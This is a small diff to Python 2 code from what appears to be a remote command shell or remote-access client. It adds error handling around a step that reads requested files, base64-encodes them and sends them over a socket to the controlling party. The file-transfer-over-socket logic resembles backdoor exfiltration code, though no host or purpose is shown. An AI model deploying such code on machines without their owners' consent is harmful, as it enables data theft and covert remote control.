@@ -61,12 +61,15 @@ def wait_for_command(s):
             except IOError, e:
                 s.send("=> " + str(e) + "\n")
                 continue
-            fdata = file.read(f)
-            f.close()
-            filename = re.sub('''"''', '', os.path.basename(data_arr[i]))
-            s.send("BEGIN: " + filename + "\n")
-            s.send(base64.encodestring(fdata))
-            s.send("END: " + filename + "\n")
+            try:
+                fdata = file.read(f)
+                f.close()
+                filename = re.sub('''"''', '', os.path.basename(data_arr[i]))
+                s.send("BEGIN: " + filename + "\n")
+                s.send(base64.encodestring(fdata))
+                s.send("END: " + filename + "\n")
+            except Exception, e:
+                s.send("Unable to read " + filename + ": " + str(e) + "\n")
         return False
     elif (len(data_arr) > 1) and (data_arr[0] == "cd"):
         try:
